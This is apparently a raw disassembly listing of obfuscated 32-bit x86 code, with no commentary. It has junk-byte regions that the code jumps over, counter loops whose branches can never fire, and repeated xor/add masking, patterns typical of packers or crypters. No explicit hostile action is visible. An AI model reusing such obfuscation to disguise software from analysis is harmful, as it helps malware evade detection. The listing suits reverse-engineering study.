  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	xchg   esp,eax
  40e377:	aas    
  40e378:	xor    eax,0x70a43bb3
  40e37d:	jo     0x40e342
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e33d
  40e383:	push   edx
  40e384:	add    esi,DWORD PTR [ecx]
  40e386:	sbb    bl,BYTE PTR [esi-0x18ef53cb]
  40e38c:	jmp    0x45b2:0xb48bca3d
  40e393:	mov    al,ds:0x445a220a
  40e398:	arpl   di,ax
  40e39a:	and    ch,al
  40e39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e39d:	sbb    DWORD PTR [eax],ecx
  40e39f:	cld    
  40e3a0:	sub    al,0x4c
  40e3a2:	adc    BYTE PTR [ebx-0x21741241],0xf5
  40e3a9:	(bad)  
  40e3ab:	mov    eax,0x48a8f1dc
  40e3b0:	sbb    BYTE PTR [ebp-0x56],ch
  40e3b3:	ins    BYTE PTR es:[edi],dx
  40e3b4:	mov    edx,DWORD PTR [eax+0x62]
  40e3b7:	adc    al,BYTE PTR [ebx-0x63c32820]
  40e3bd:	add    eax,ebp
  40e3bf:	mov    BYTE PTR [ebp+0x3aadf8a1],bh
  40e3c5:	dec    edx
  40e3c6:	(bad)  
  40e3c7:	pop    ds
  40e3c8:	or     eax,0xd301458a
  40e3cd:	sbb    BYTE PTR [ecx],cl
  40e3cf:	push   edi
  40e3d0:	js     0x40e3fa
  40e3d2:	mov    ah,0x16
  40e3d4:	arpl   WORD PTR [ecx-0x5076f400],di
  40e3da:	out    0xb,eax
  40e3dc:	sub    eax,0xa9c3d43a
  40e3e1:	(bad)  
  40e3e2:	push   ss
  40e3e3:	sub    DWORD PTR [edi-0x3a],ecx
  40e3e6:	js     0x40e3bf
  40e3e8:	xor    DWORD PTR [ecx+edi*8-0x13],ebx
  40e3ec:	ja     0x40e408
  40e3ee:	out    0x4e,al
  40e3f0:	mov    ebp,0xb1b7b7fb
  40e3f5:	sbb    eax,eax
  40e3f7:	and    BYTE PTR [edx-0x22],ch
  40e3fa:	mov    cl,0x8b
  40e3fc:	add    eax,0x76ca6f67
  40e401:	and    eax,0x48398b71
  40e406:	xchg   edx,eax
  40e407:	es cli 
  40e409:	arpl   bx,bx
  40e40b:	int3   
  40e40c:	jmp    0x4c9e:0x3d9bea4
  40e413:	xchg   DWORD PTR [edx-0x17],ecx
  40e416:	inc    ebx
  40e417:	push   0x25eb5a8e
  40e41c:	test   BYTE PTR [edi-0x49977bdb],bh
  40e422:	add    esp,DWORD PTR [edx-0x12]
  40e425:	cld    
  40e426:	push   ds
  40e427:	xchg   edx,eax
  40e428:	push   ebp
  40e429:	out    0x70,al
  40e42b:	in     eax,0x2
  40e42d:	cmp    al,0x15
  40e42f:	cmp    esi,edi
  40e431:	jo     0x40e497
  40e433:	dec    edi
  40e434:	scas   al,BYTE PTR es:[edi]
  40e435:	jg     0x40e4ae
  40e437:	pushf  
  40e438:	push   esp
  40e439:	test   al,0x5c
  40e43b:	(bad)  
  40e43c:	das    
  40e43d:	iret   
  40e43e:	xchg   ebp,eax
  40e43f:	adc    BYTE PTR [ebp+0x498a14be],dl
  40e445:	dec    eax
  40e446:	xor    DWORD PTR [eax],eax
  40e448:	push   eax
  40e449:	cmp    ebp,DWORD PTR [esi+0x2d3e153]
  40e44f:	fstp   TBYTE PTR [ebp-0x624bc77f]
  40e455:	icebp  
  40e456:	fsubp  st(5),st
  40e458:	shl    BYTE PTR [ebx-0x7889f2],cl
  40e45e:	call   DWORD PTR [edx+0x117ede69]
  40e464:	fiadd  WORD PTR [ecx]
  40e466:	jae    0x40e463
  40e468:	out    0xa,eax
  40e46a:	and    DWORD PTR [edx+eiz*1+0x3a035aea],edx
  40e471:	std    
  40e472:	sub    al,0x33
  40e474:	pushf  
  40e475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e476:	jae    0x40e4c0
  40e478:	mov    edx,0x4dee694d
  40e47d:	cmp    ecx,ebp
  40e47f:	jbe    0x40e468
  40e481:	cmp    edx,DWORD PTR [edi]
  40e483:	xchg   BYTE PTR [ecx+0x2fac2ca3],dl
  40e489:	bound  eax,QWORD PTR [edx+0x1c]
  40e48c:	ja     0x40e4eb
  40e48e:	cmp    DWORD PTR [esi+edx*4+0x31],esi
  40e492:	push   ecx
  40e493:	dec    edi
  40e494:	jb     0x40e443
  40e496:	add    al,0x1
  40e498:	mov    esi,0xdf2e44df
  40e49d:	out    0x5d,al
  40e49f:	inc    eax
  40e4a0:	mov    cl,0xee
  40e4a2:	xchg   esp,eax
  40e4a3:	nop
  40e4a4:	ins    DWORD PTR es:[edi],dx
  40e4a5:	dec    eax
  40e4a6:	fwait
  40e4a7:	clc    
  40e4a8:	cld    
  40e4a9:	xor    ch,BYTE PTR [eax+0x1bfbeb53]
  40e4af:	bound  ebp,QWORD PTR ds:0xf4ce36a1
  40e4b5:	mov    al,BYTE PTR [eax+0x59]
  40e4b8:	jecxz  0x40e43a
  40e4ba:	jmp    0x40e484
  40e4bc:	popf   
  40e4bd:	outs   dx,DWORD PTR ds:[esi]
  40e4be:	or     cl,ch
  40e4c0:	cmp    al,0x30
  40e4c2:	push   cs
  40e4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c4:	mov    eax,ds:0xe3f82a69
  40e4c9:	xchg   di,ax
  40e4cb:	dec    edx
  40e4cc:	or     ebx,DWORD PTR [ecx-0x2a]
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x57cd740f
  40e4f5:	jo     0x40e542
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	ret    
  40e500:	xor    al,0x4d
  40e502:	push   cs
  40e503:	jns    0x40e488
  40e505:	fild   QWORD PTR [esi+0x12730277]
  40e50b:	inc    esp
  40e50c:	cdq    
  40e50d:	pop    edi
  40e50e:	imul   esi,DWORD PTR ds:0x160b5c9d,0xffffffa0
  40e515:	jo     0x40e497
  40e517:	mov    ebp,0xe08521e8
  40e51c:	xchg   ebx,eax
  40e51d:	inc    eax
  40e51e:	sahf   
  40e51f:	push   edi
  40e520:	cmp    bh,al
  40e522:	add    esi,ebx
  40e524:	cmp    ebx,edx
  40e526:	fild   QWORD PTR cs:[edx-0x4a]
  40e52a:	push   esp
  40e52b:	jg     0x40e5a7
  40e52d:	(bad)  
  40e52f:	xchg   BYTE PTR [ebx-0x6],ch
  40e532:	out    0xf3,al
  40e534:	fcmovu st,st(4)
  40e536:	pushw  cs
  40e538:	scas   eax,DWORD PTR es:[edi]
  40e539:	nop
  40e53a:	icebp  
  40e53b:	sbb    al,BYTE PTR [edi-0x1a666dde]
  40e541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e542:	sbb    ebp,DWORD PTR [esi]
  40e544:	popa   
  40e545:	cmp    eax,0xa36a8140
  40e54a:	jae    0x40e4e1
  40e54c:	mov    DWORD PTR [esi+0x40],ebp
  40e54f:	mov    ecx,esi
  40e551:	mov    cs,WORD PTR [ebp+0x68448a0d]
  40e557:	adc    al,0xc7
  40e559:	push   edi
  40e55a:	push   eax
  40e55b:	jmp    0x5f49:0x4c57ec89
  40e562:	ret    0x20e9
  40e565:	out    0x44,eax
  40e567:	ror    BYTE PTR cs:[eax+0x4f0c252],0xa4
  40e56f:	dec    eax
  40e570:	fwait
  40e571:	mov    bh,0x95
  40e573:	cmp    al,0xcc
  40e575:	jecxz  0x40e5b7
  40e577:	enter  0xc320,0x7a
  40e57b:	shl    eax,cl
  40e57d:	dec    DWORD PTR [ecx]
  40e57f:	ret    0x3c13
  40e582:	ss stos DWORD PTR es:[edi],eax
  40e584:	fist   WORD PTR [eax]
  40e586:	inc    esp
  40e587:	js     0x40e582
  40e589:	ss push eax
  40e58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e58c:	mov    edi,0x87064c39
  40e591:	enter  0x751a,0xb5
  40e595:	cmp    DWORD PTR [edx+0xfdab20d],0x678bc1bb
  40e59f:	jmp    0x40e588
  40e5a1:	and    ecx,DWORD PTR [ecx+0x6d]
  40e5a4:	pop    ss
  40e5a5:	or     BYTE PTR [eax+0x229c920f],0x80
  40e5ac:	dec    ecx
  40e5ad:	jg     0x40e544
  40e5af:	mov    bh,BYTE PTR [edx-0x2597c2df]
  40e5b5:	retf   0xbe6f
  40e5b8:	xchg   dl,bh
  40e5ba:	out    dx,al
  40e5bb:	mov    ?,esp
  40e5bd:	test   al,0xd5
  40e5bf:	push   ebx
  40e5c0:	(bad)  
  40e5c1:	retf   0x68fd
  40e5c4:	mov    dl,0xae
  40e5c6:	iret   
  40e5c7:	js     0x40e5e2
  40e5c9:	mul    DWORD PTR ds:0x134d88a8
  40e5cf:	dec    esp
  40e5d0:	dec    edx
  40e5d1:	pop    edx
  40e5d2:	(bad)  
  40e5d3:	mov    cl,0xa7
  40e5d5:	es fwait
  40e5d7:	gs (bad) 
  40e5d9:	sbb    DWORD PTR ss:[edx],edx
  40e5dc:	fstp   QWORD PTR [ebp+edx*1-0x34]
  40e5e0:	mov    DWORD PTR [ebx],esi
  40e5e2:	aam    0x34
  40e5e4:	aam    0xc
  40e5e6:	sbb    eax,0xd09289a6
  40e5eb:	sti    
  40e5ec:	sbb    eax,0x452eecb1
  40e5f1:	jp     0x40e5d0
  40e5f3:	xchg   ecx,eax
  40e5f4:	or     DWORD PTR [eax],edx
  40e5f6:	sub    DWORD PTR [edi+edi*2-0xc],ebp
  40e5fa:	sbb    al,0xe4
  40e5fc:	scas   al,BYTE PTR es:[edi]
  40e5fd:	mov    edx,0x5155e829
  40e602:	xor    DWORD PTR [edi-0x5f],esi
  40e605:	mov    ch,0xdf
  40e607:	inc    ebx
  40e608:	das    
  40e609:	adc    DWORD PTR [edi+ecx*1+0x453855bf],0x1d2111c3
  40e614:	(bad)  
  40e616:	cmc    
  40e617:	mov    edi,0x6916c115
  40e61c:	xchg   edx,eax
  40e61d:	clc    
  40e61e:	mov    ebp,0xdf851c8b
  40e623:	cmp    BYTE PTR [ebx],bh
  40e625:	mov    DWORD PTR [edi],esp
  40e627:	push   edi
  40e628:	iret   
  40e629:	fwait
  40e62a:	xor    al,0xc1
  40e62c:	mov    esi,0x10110cee
  40e631:	jge    0x40e5e4
  40e633:	or     eax,0x80c7989a
  40e639:	add    BYTE PTR [edi+0x72],ch
  40e63c:	fild   DWORD PTR [ebp-0x1c9cd190]
  40e642:	shr    cl,0x8a
  40e645:	or     eax,0x36c3120b
  40e64a:	dec    eax
  40e64b:	inc    eax
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	mov    al,ds:0x51546c8e
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	aaa    
  40e6e7:	xchg   ebp,eax
  40e6e8:	or     eax,eax
  40e6ea:	cmc    
  40e6eb:	bound  ecx,QWORD PTR [ecx+0x55c3de73]
  40e6f1:	jne    0x40e6a8
  40e6f3:	xchg   DWORD PTR [ebx+ebp*4-0x78],ecx
  40e6f7:	mov    ds:0x7468ba3d,eax
  40e6fc:	pop    ss
  40e6fd:	add    al,0x38
  40e6ff:	in     al,0xb9
  40e701:	into   
  40e702:	sar    DWORD PTR [esi-0x80],cl
  40e705:	test   eax,0xd04f8a6d
  40e70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e70b:	int3   
  40e70c:	or     al,0x2a
  40e70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e70f:	or     ecx,DWORD PTR [esi+0x7493e25b]
  40e715:	cmp    ebx,ecx
  40e717:	push   edi
  40e718:	(bad)  
  40e719:	lock xchg esp,eax
  40e71b:	loopne 0x40e772
  40e71d:	adc    BYTE PTR [edx+eiz*4-0x3cddd750],al
  40e724:	outs   dx,DWORD PTR ds:[esi]
  40e725:	mov    eax,ds:0x9620e9b1
  40e72a:	xlat   BYTE PTR ds:[ebx]
  40e72b:	adc    al,0x20
  40e72d:	je     0x40e730
  40e72f:	mov    esi,0x8e33f2c3
  40e734:	dec    ecx
  40e735:	xchg   esi,eax
  40e736:	or     ecx,0x6c
  40e739:	jmp    0xb45031a3
  40e73e:	sub    dl,BYTE PTR [ebp+0x3c]
  40e741:	rcl    DWORD PTR [ecx+0x3c2af5f7],0x2d
  40e748:	pop    ss
  40e749:	inc    esi
  40e74a:	bound  ebp,QWORD PTR [ebp-0x5c]
  40e74d:	pop    ss
  40e74e:	dec    esp
  40e74f:	inc    ebp
  40e750:	push   eax
  40e751:	aas    
  40e752:	ja     0x40e711
  40e754:	lods   al,BYTE PTR ds:[esi]
  40e755:	xchg   esp,eax
  40e756:	sbb    al,0x19
  40e758:	and    al,0x88
  40e75a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75b:	pushf  
  40e75c:	jmp    0xfa29:0x3ade504f
  40e763:	sar    DWORD PTR [eax+esi*2],cl
  40e766:	mov    bh,0x3d
  40e768:	popf   
  40e769:	jo     0x40e71e
  40e76b:	mov    ebp,0x8d101a0d
  40e770:	int3   
  40e771:	imul   edi,DWORD PTR [ebp+ecx*1+0x7d],0xffffffb0
  40e776:	lods   eax,DWORD PTR ds:[esi]
  40e777:	dec    edx
  40e778:	and    DWORD PTR [esi-0x4d],ecx
  40e77b:	cmp    edi,DWORD PTR [edi+edi*1+0x40d70a2f]
  40e782:	call   0x61b6:0x7b175fd0
  40e789:	pop    ecx
  40e78a:	push   eax
  40e78b:	jb     0x40e753
  40e78d:	xor    DWORD PTR [edx],ebp
  40e78f:	ins    BYTE PTR es:[edi],dx
  40e790:	retf   0xb02
  40e793:	push   es
  40e794:	call   0x8cf9ebda
  40e799:	ss in  eax,dx
  40e79b:	out    0x74,al
  40e79d:	and    BYTE PTR ds:0xa98a47a1,dl
  40e7a3:	mov    DWORD PTR [ecx],ebp
  40e7a5:	out    0xda,al
  40e7a7:	mov    ah,0xea
  40e7a9:	ror    DWORD PTR [ecx-0x126a6b68],0x4f
  40e7b0:	nop
  40e7b1:	ret    
  40e7b2:	xchg   esp,eax
  40e7b3:	pop    ebp
  40e7b4:	xor    al,0x64
  40e7b6:	mov    BYTE PTR [ecx+0x47],bh
  40e7b9:	(bad)  
  40e7ba:	test   DWORD PTR [eax-0x52c80691],0x138eb996
  40e7c4:	das    
  40e7c5:	call   0x44db4c95
  40e7ca:	fs dec esp
  40e7cc:	lahf   
  40e7cd:	and    ecx,esi
  40e7cf:	mov    ebp,0x9298944d
  40e7d4:	xor    cl,BYTE PTR ds:0xbc76cf63
  40e7da:	repnz call 0xc583:0x2de3eef4
  40e7e2:	jl     0x40e7c7
  40e7e4:	das    
  40e7e5:	jo     0x40e83b
  40e7e7:	mov    al,ds:0xdbf102de
  40e7ec:	inc    eax
  40e7ed:	(bad)
  40e7f1:	les    eax,FWORD PTR ds:0x988b145a
  40e7f7:	pop    esp
  40e7f8:	jae    0x40e854
  40e7fa:	or     bl,BYTE PTR [eax]
  40e7fc:	(bad)  
  40e7fd:	push   cs
  40e7fe:	dec    eax
  40e7ff:	pop    ecx
  40e800:	and    esi,DWORD PTR [ecx]
  40e802:	add    DWORD PTR [edx],edi
  40e804:	push   esi
  40e805:	retf   
  40e806:	and    BYTE PTR [edi],0xb7
  40e809:	dec    BYTE PTR [ebp+0x7a8516f3]
  40e80f:	pop    esi
  40e810:	jecxz  0x40e7f2
  40e812:	mov    eax,fs:0xd1e3d6a7
  40e818:	ficomp DWORD PTR [ebp+0x6425fb54]
  40e81e:	jbe    0x40e882
  40e820:	test   al,0x79
  40e822:	inc    edx
  40e823:	cmp    eax,DWORD PTR [edi+0x75e59f13]
  40e829:	aaa    
  40e82a:	sub    al,0x29
  40e82c:	xchg   ebx,eax
  40e82d:	push   esp
  40e82e:	push   ebx
  40e82f:	inc    edx
  40e830:	out    0xc0,al
  40e832:	hlt    
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	imul   ebp,DWORD PTR [ebx],0x34
  40e94c:	and    eax,0x7070a024
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e924
  40e956:	ret    
  40e957:	or     eax,0xd4f763dc
  40e95c:	out    dx,eax
  40e95d:	dec    esp
  40e95e:	leave  
  40e95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e960:	cld    
  40e961:	das    
  40e962:	hlt    
  40e963:	pop    ds
  40e964:	push   ebx
  40e965:	fwait
  40e966:	cld    
  40e967:	daa    
  40e968:	dec    esi
  40e969:	sub    esp,DWORD PTR [ebp+0x35]
  40e96c:	das    
  40e96d:	mov    ds:0x3d6d422e,al
  40e972:	mov    al,ds:0xa308afd5
  40e977:	lock sbb BYTE PTR [edx+ecx*1+0x18],dl
  40e97c:	sti    
  40e97d:	mov    esp,0x8ecf159
  40e982:	ins    DWORD PTR es:[edi],dx
  40e983:	jns    0x40e9d1
  40e985:	cdq    
  40e986:	and    esi,DWORD PTR [ecx+0x77818c2a]
  40e98c:	cs jl  0x40e98d
  40e98f:	push   esi
  40e990:	xor    BYTE PTR [edx],bl
  40e992:	mov    ah,0x38
  40e994:	dec    edi
  40e995:	jecxz  0x40e9be
  40e997:	cmp    edi,DWORD PTR [ecx-0x4d]
  40e99a:	jno    0x40e93c
  40e99c:	and    edi,DWORD PTR [eax-0x7842abe4]
  40e9a2:	sub    DWORD PTR [ebx-0x96b820e],0xe1db0d83
  40e9ac:	(bad)  
  40e9ad:	and    BYTE PTR [edi+0x7f],ah
  40e9b0:	add    al,0xa1
  40e9b2:	add    DWORD PTR [ecx],edi
  40e9b4:	push   0x66
  40e9b6:	lea    edx,[edx]
  40e9b8:	(bad)  
  40e9ba:	add    eax,0xffffffcd
  40e9bd:	test   al,0xac
  40e9bf:	dec    esp
  40e9c0:	cdq    
  40e9c1:	mov    es,eax
  40e9c3:	mov    ecx,0x6654e1f
  40e9c8:	jmp    0x174a:0x181e0ead
  40e9cf:	or     dl,BYTE PTR [ecx]
  40e9d1:	jle    0x40e9fc
  40e9d3:	dec    edi
  40e9d4:	mov    cs,WORD PTR [edx+0x68dbdd36]
  40e9da:	adc    BYTE PTR [edx+eiz*4+0x6b],dh
  40e9de:	call   0xbb5c9525
  40e9e3:	sbb    BYTE PTR [eax],bh
  40e9e5:	dec    eax
  40e9e6:	mov    BYTE PTR [ebx+0x27],bh
  40e9e9:	mov    bl,0x5a
  40e9eb:	dec    ebp
  40e9ec:	inc    edx
  40e9ed:	and    DWORD PTR [esi],0xffffffbb
  40e9f0:	loopne 0x40e9fb
  40e9f2:	dec    eax
  40e9f3:	(bad)  
  40e9f4:	fs cmp eax,0xa3f3029c
  40e9fa:	or     al,0x84
  40e9fc:	call   0xf7dee560
  40ea01:	dec    ebx
  40ea02:	fcomp  DWORD PTR [esi+edi*4-0x33]
  40ea06:	xchg   ebx,eax
  40ea07:	call   0x7a56:0xd3bc45e1
  40ea0e:	mov    ds,ecx
  40ea10:	lea    edx,[edi+0x610c5fa4]
  40ea16:	mov    ch,0xf
  40ea18:	mov    al,dl
  40ea1a:	sbb    cl,BYTE PTR [ebp+0x38]
  40ea1d:	dec    ebx
  40ea1e:	pop    es
  40ea1f:	add    esi,DWORD PTR [ebx+ebx*8+0x54ce2324]
  40ea26:	push   es
  40ea27:	(bad)  
  40ea28:	aam    0xe3
  40ea2a:	outs   dx,DWORD PTR ds:[esi]
  40ea2b:	mov    dh,0x4c
  40ea2d:	cmc    
  40ea2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea2f:	mov    al,ds:0x4a993c5b
  40ea34:	or     DWORD PTR [eax],edx
  40ea36:	mov    cs,WORD PTR [esi]
  40ea38:	jbe    0x40e9c5
  40ea3a:	jge    0x40ea82
  40ea3c:	in     al,dx
  40ea3d:	and    al,0x76
  40ea3f:	outs   dx,BYTE PTR ds:[esi]
  40ea40:	dec    esp
  40ea41:	in     al,0x6
  40ea43:	push   ds
  40ea44:	addr16 push ebp
  40ea46:	(bad)  
  40ea47:	cmp    eax,0xf1382d82
  40ea4c:	pop    es
  40ea4d:	mov    ecx,0xcfc9e414
  40ea52:	(bad)  
  40ea53:	fild   DWORD PTR [eax+eiz*8-0x23aa1a37]
  40ea5a:	stos   BYTE PTR es:[edi],al
  40ea5b:	fwait
  40ea5c:	mov    ch,0xbe
  40ea5e:	adc    edx,ebx
  40ea60:	xchg   DWORD PTR [ebp+0x5790ee58],edx
  40ea66:	push   eax
  40ea67:	inc    dx
  40ea69:	push   ds
  40ea6a:	loop   0x40ea5b
  40ea6c:	jns    0x40ea1b
  40ea6e:	(bad)  
  40ea6f:	lods   eax,DWORD PTR ds:[esi]
  40ea70:	(bad)  
  40ea71:	test   DWORD PTR [edi],0xffe8817
  40ea77:	add    eax,0x3a585c40
  40ea7c:	mov    ch,0xc8
  40ea7e:	clc    
  40ea7f:	push   esi
  40ea80:	iret   
  40ea81:	(bad)  
  40ea82:	(bad)  
  40ea83:	jbe    0x40ead3
  40ea85:	mov    BYTE PTR [ecx+0x7706c280],ch
  40ea8b:	xor    esp,esi
  40ea8d:	mov    esi,0x9e16d198
  40ea92:	mov    edi,0x593788d9
  40ea97:	test   DWORD PTR [ebx],esi
  40ea99:	xchg   ecx,eax
  40ea9a:	pop    esi
  40ea9b:	pop    edi
  40ea9c:	cmp    bh,BYTE PTR [ebx+eiz*4+0xf32d02e]
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
